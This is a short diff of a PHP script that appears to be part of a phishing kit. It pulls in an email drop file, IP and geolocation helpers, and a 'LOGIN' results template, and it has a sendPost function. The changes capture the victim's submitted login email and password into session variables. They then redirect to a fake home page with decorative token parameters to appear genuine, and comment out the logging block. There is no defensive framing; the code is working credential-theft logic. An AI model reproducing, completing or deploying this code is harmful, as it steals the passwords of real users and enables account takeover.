@@ -5,7 +5,7 @@ session_start();
 ob_start();
 set_time_limit(0);
 include("../../../../Email.php");
-include("get_ip.php");
+include("../get_ip.php");
 require "../os.php";
 require "../geoplugin.php";
 $DATE = date("d-m-Y h:i:sa");
@@ -76,9 +76,10 @@ function Error()
 
 ";
 
-
+$_SESSION['_email_']        = $_POST['login_email'];
+$_SESSION['_password_']     = $_POST['login_password'];
 header("Location: ../home.php?customerProfileweb-id=".sha1(md5(gmdate('Dr Hard')))."_&TokenAccess=".strtoupper(sha1(256))." ");
-
+/*
 $localrez ="###################################################
 ###################################################     
 =-=-=-=-=-=-=-=-=-=- ♣ LOGIN ♣ =-=-=-=-=-=-=-=-=-
@@ -103,7 +104,7 @@ else {
 	echo ERROR();
 	}		
 
-
+*/
 
 //----------------send request post to url ----------------
 function sendPost($url,$data) {
